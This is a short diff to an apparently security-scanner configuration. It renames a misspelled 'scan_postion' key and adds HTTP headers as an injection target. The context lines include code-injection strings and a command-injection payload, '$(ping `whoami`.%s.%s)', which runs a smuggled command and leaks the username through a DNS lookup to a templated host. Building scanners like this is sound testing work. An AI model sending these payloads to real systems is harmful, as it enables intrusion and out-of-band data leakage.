@@ -27,7 +27,7 @@ code_inject_config = {
         "\".(print(%s*%s)).\"",
     ],
 
-    "scan_postion": ["get", "post", "cookie"],
+    "scan_position": ["get", "post", "cookie"],
 }
 
 command_inject_config = {
@@ -36,5 +36,5 @@ command_inject_config = {
 
     "payload": ["$(ping `whoami`.%s.%s)"],
 
-    "scan_postion": ["get", "post", "cookie"],
+    "scan_position": ["get", "post", "cookie", "header"],
 }
